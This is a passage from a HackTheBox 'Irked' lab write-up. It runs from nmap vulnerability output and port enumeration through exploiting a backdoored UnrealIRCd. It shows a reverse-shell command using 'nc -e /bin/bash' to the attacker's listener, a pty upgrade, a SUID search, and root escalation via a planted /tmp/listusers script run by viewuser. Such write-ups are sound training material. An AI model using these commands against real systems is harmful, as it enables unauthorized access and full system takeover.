ROS-2_0_SP1-CVE-2018-1312/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP1-CVE-2017-15715/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/     6.8     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/   *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/      6.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/
*EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/        6.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-20
17-15715/       *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312 
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715 
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2
*EXPLOIT* 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       CVE-2016-5387   5.1     https://vulners.com/cve/CVE-2016-5387 
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/    *
EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/     5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2017-15710/    *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-8743/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-2161/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-2161/     *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-0736/      5.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2016-0736/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/      5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2017-15710/     *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/        5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
17-15710/       *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED  5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APAC
HE_OPTIONSBLEED *EXPLOIT* 
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF
72FC7FDC4755A7  *EXPLOIT* 
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0
405CB0AA9C075D  *EXPLOIT* 
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT* 
|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303 
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798 
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710 
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743 
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161 
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736 
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183 
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228 
|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583 
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT* 
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1302/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/     *
EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1301/       4.3     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/     *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/       4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2016-4975/      *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11985/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302 
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301 
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975 
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185 
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/      3.5     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2018-1283/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/       3.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2018-1283/      *EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/ 3.5     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/
*EXPLOIT* 
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283 
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612 
|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT* 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000) 
| rpcinfo:  
|   program version    port/proto  service 
|   100000  2,3,4        111/tcp   rpcbind 
|   100000  2,3,4        111/udp   rpcbind 
|   100000  3,4          111/tcp6  rpcbind 
|   100000  3,4          111/udp6  rpcbind 
|   100024  1          37175/udp6  status 
|   100024  1          43230/tcp   status 
|   100024  1          43799/tcp6  status 
|_  100024  1          59581/udp   status 
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd 
|_ssl-ccs-injection: No reply from server (TIMEOUT) 
| irc-botnet-channels:  
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information. 
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd 
| irc-botnet-channels:  
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information. 
43230/tcp open  status  syn-ack ttl 63 1 (RPC #100024) 
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd (Admin email djmardov@irked.htb) 
| irc-botnet-channels:  
|_  ERROR: Closing Link: [10.10.14.2] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information. 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete 
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 
(95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%) 
No exact OS matches for host (test conditions non-ideal). 
TCP/IP fingerprint: 
SCAN(V=7.92%E=4%D=4/7%OT=22%CT=%CU=32319%PV=Y%DS=2%DC=T%G=N%TM=624F1EC5%P=x86_64-pc-linux-gnu) 
SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=I%II=I%TS=8) 
OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11) 
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120) 
ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=) 
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=) 
T2(R=N) 
T3(R=N) 
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) 
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) 
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) 
IE(R=Y%DFI=N%T=40%CD=S) 
 
Uptime guess: 0.001 days (since Thu Apr  7 22:54:57 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=264 (Good luck!) 
IP ID Sequence Generation: All zeros 
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel 
 
TRACEROUTE (using port 80/tcp) 
HOP RTT       ADDRESS 
1   270.48 ms 10.10.14.1 
2   269.79 ms 10.10.10.117 
 
NSE: Script Post-scanning. 
NSE: Starting runlevel 1 (of 2) scan. 
Initiating NSE at 22:56 
Completed NSE at 22:56, 0.00s elapsed 
NSE: Starting runlevel 2 (of 2) scan. 
Initiating NSE at 22:56 
Completed NSE at 22:56, 0.00s elapsed 
Read data files from: /usr/bin/../share/nmap 
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 83.49 seconds 
           Raw packets sent: 66 (4.516KB) | Rcvd: 40 (3.044KB)
```

## it gives other 3 ports too now we have 6 ports open. let's start with http port, after accessing we got a image that given below

![http](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Irked/http.png)

## i enumerate further and found nothing gobuster also not show any directory , /manual directory leads us to the default Apache HTTP server page. A dead end. Let's move on other ports 111 port is rpcbind 2-4, Ports 6697, 8067 & 65534 are running UnrealIRCd. after searching on google about UnrealIRCd we found a version of this service is vulnrable to backdoor command execution .

## we have nmap script known as irc-unrealircd-backdoor that check ports for this vulnerability

```
sudo nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
```

### Result

```
PORT      STATE SERVICE 
6697/tcp  open  ircs-u 
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 
8067/tcp  open  infi-async 
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277 
65534/tcp open  unknown 
 
Nmap done: 1 IP address (1 host up) scanned in 33.82 seconds
```

## we found port 6697 and 8067 is vulnerable !

## now start a netcat listner

```
nc -nvlp 4444
```

## and send a reverse shell to our listner form local machine using nmap and same script.

```
nmap -p 6697 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.2 4444" 10.10.10.117
```

## we got shell in few minutes , now let's upgrade our shell using python tty shell.

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## sudo -l not working let's try to find suid files using below command

```
find / -perm -u=s -type f 2>/dev/null
```

### Result

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper 
/usr/lib/eject/dmcrypt-get-device 
/usr/lib/policykit-1/polkit-agent-helper-1 
/usr/lib/openssh/ssh-keysign 
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper 
/usr/sbin/exim4 
/usr/sbin/pppd 
/usr/bin/chsh 
/usr/bin/procmail 
/usr/bin/gpasswd 
/usr/bin/newgrp 
/usr/bin/at 
/usr/bin/pkexec 
/usr/bin/X 
/usr/bin/passwd 
/usr/bin/chfn 
/usr/bin/viewuser 
/sbin/mount.nfs 
/bin/su 
/bin/mount 
/bin/fusermount 
/bin/ntfs-3g 
/bin/umount
```

## here we found a program name viewuser when we try to execute it shows 

```
This application is being devleoped to set and test user permissions 
It is still being actively developed 
(unknown) :0           2022-04-07 13:18 (:0) 
sh: 1: /tmp/listusers: not found
```

## that's simple we only need to add listusers file with a bash command with executable permission. add below content in listusers file.

```
#! /bin/bash

bash
```

## give this file executable permission using below command

```
chmod +x listusers
```

## now let's again try to run viewuser 

# BOOOMMM!! WE GOT ROOT SHELL.

![end](https://i0.wp.com/chicagostylesports.com/wp-content/uploads/2016/02/Stephen-colbert-celebration-gif.gif?ssl=1)
